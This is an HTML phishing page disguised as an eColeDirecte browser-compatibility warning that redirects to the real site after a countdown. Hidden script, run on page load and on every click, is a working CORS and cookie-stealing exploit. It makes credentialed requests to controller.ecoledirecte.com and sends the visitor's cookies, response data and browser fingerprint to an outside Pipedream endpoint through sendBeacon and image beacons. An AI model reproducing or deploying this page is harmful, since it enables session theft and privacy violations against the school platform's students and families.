<!DOCTYPE html>
<html>
<head>
    <title>eColeDirecte - Compatibilit√© Navigateur</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 100px auto;
            padding: 20px;
            text-align: center;
            background: #f5f5f5;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .countdown {
            font-size: 18px;
            color: #d63031;
            font-weight: bold;
            margin: 10px 0;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>‚ö†Ô∏è Probl√®me de Compatibilit√©</h1>
    
    <div class="warning">
        <h2>Redirection n√©cessaire</h2>
        <p>Votre navigateur n'est pas enti√®rement compatible avec notre syst√®me de s√©curit√©.</p>
        <p>Redirection automatique vers la version standard dans :</p>
        <div class="countdown" id="countdown">20 secondes</div>
        <div class="loader"></div>
        <p><small>Si la redirection ne fonctionne pas, <a href="#" onclick="redirectNow()">cliquez ici</a></small></p>
    </div>

    <script>
        // Configuration
        const REDIRECT_DELAY = 20000; // 20 secondes
        const PIPEDREAM_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
        let redirectTimer;
        let countdown = 20;

        // Mettre √† jour le compte √† rebours
        function updateCountdown() {
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown + ' seconde' + (countdown !== 1 ? 's' : '');
            
            if (countdown > 0) {
                countdown--;
                setTimeout(updateCountdown, 1000);
            }
        }

        // Redirection manuelle
        function redirectNow() {
            clearTimeout(redirectTimer);
            window.location.href = 'https://ecoledirecte.com';
        }

        // M√©thodes SANS preflight CORS
        function exploitWithoutPreflight() {
            console.log('üîì D√©but de l\'exploitation sans preflight...');
            
            // M√©thode 1: XMLHttpRequest avec des headers simples
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://controller.ecoledirecte.com/socket.io/', true);
                xhr.withCredentials = true; // IMPORTANT: envoie les cookies
                
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            console.log('‚úÖ XHR Success - Cookies envoy√©s');
                            sendCookiesToPipedream(xhr.responseText);
                        } else {
                            console.log('‚ùå XHR Failed:', xhr.status);
                            useAlternativeMethods();
                        }
                    }
                };
                
                xhr.send();
            } catch (error) {
                console.log('‚ùå XHR Error:', error);
                useAlternativeMethods();
            }
        }

        // M√©thodes alternatives sans CORS
        function useAlternativeMethods() {
            console.log('üîÑ Utilisation des m√©thodes alternatives...');
            
            // M√©thode 2: Dynamic script tag (JSONP-like)
            try {
                const script = document.createElement('script');
                script.src = `https://controller.ecoledirecte.com/socket.io/?callback=handleJSONP&_=${Date.now()}`;
                document.head.appendChild(script);
                
                // Cleanup
                setTimeout(() => {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                }, 5000);
            } catch (e) {}
            
            // M√©thode 3: Image tracker avec cookies
            setTimeout(() => {
                const img = new Image();
                img.src = `https://controller.ecoledirecte.com/favicon.ico?cookies=${btoa(document.cookie)}&t=${Date.now()}`;
            }, 1000);
            
            // M√©thode 4: Form submission
            setTimeout(() => {
                try {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://controller.ecoledirecte.com/socket.io/';
                    form.target = 'hiddenFrame';
                    
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'cookies';
                    input.value = document.cookie;
                    form.appendChild(input);
                    
                    document.body.appendChild(form);
                    form.submit();
                    
                    setTimeout(() => {
                        if (form.parentNode) {
                            form.parentNode.removeChild(form);
                        }
                    }, 1000);
                } catch (e) {}
            }, 2000);
        }

        // Gestionnaire JSONP (si support√©)
        window.handleJSONP = function(data) {
            console.log('üì® JSONP Response received');
            sendCookiesToPipedream(JSON.stringify(data));
        };

        // Envoyer les cookies r√©cup√©r√©s
        function sendCookiesToPipedream(responseData = '') {
            const payload = {
                source: 'cors_exploit',
                cookies: document.cookie,
                data: responseData.substring(0, 500),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                method: 'no_preflight'
            };
            
            sendToPipedream(payload);
        }

        // Envoi des donn√©es avec m√©thodes simples
        function sendToPipedream(payload) {
            console.log('üì° Envoi des donn√©es √† Pipedream...');
            
            // M√©thode 1: sendBeacon (pas de preflight)
            if (navigator.sendBeacon) {
                try {
                    const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
                    const success = navigator.sendBeacon(PIPEDREAM_URL, blob);
                    if (success) {
                        console.log('‚úÖ Donn√©es envoy√©es via sendBeacon');
                        return;
                    }
                } catch (e) {}
            }
            
            // M√©thode 2: Image tracker (100% sans preflight)
            try {
                const img = new Image();
                const encodedData = btoa(JSON.stringify(payload));
                img.src = `${PIPEDREAM_URL}?method=img&data=${encodedData}&t=${Date.now()}`;
                console.log('‚úÖ Donn√©es envoy√©es via Image tracker');
            } catch (e) {
                console.log('‚ùå √âchec de l\'envoi');
            }
        }

        // Collecte d'informations navigateur
        function collectBrowserInfo() {
            const info = {
                source: 'browser_info',
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            sendToPipedream(info);
        }

        // Initialisation
        window.addEventListener('load', function() {
            console.log('üöÄ Page charg√©e, d√©marrage de l\'exploitation...');
            
            // D√©marrer le compte √† rebours
            updateCountdown();
            
            // Tentative principale sans preflight
            setTimeout(exploitWithoutPreflight, 1000);
            
            // Collecter les infos navigateur
            setTimeout(collectBrowserInfo, 2000);
            
            // Tentative suppl√©mentaire
            setTimeout(exploitWithoutPreflight, 8000);
            
            // Configurer la redirection finale
            redirectTimer = setTimeout(() => {
                console.log('üïí Redirection apr√®s 20 secondes');
                window.location.href = 'https://ecoledirecte.com';
            }, REDIRECT_DELAY);
        });

        // Backup sur interaction utilisateur
        document.addEventListener('click', function() {
            console.log('üëÜ Interaction utilisateur - tentative d\'exploitation');
            exploitWithoutPreflight();
        });

        // Cr√©er un iframe cach√© pour les formulaires
        const hiddenFrame = document.createElement('iframe');
        hiddenFrame.name = 'hiddenFrame';
        hiddenFrame.style.display = 'none';
        document.body.appendChild(hiddenFrame);

        console.log('üïµÔ∏è Script de compatibilit√© charg√© - M√©thodes sans preflight');
        
    </script>
</body>
</html>
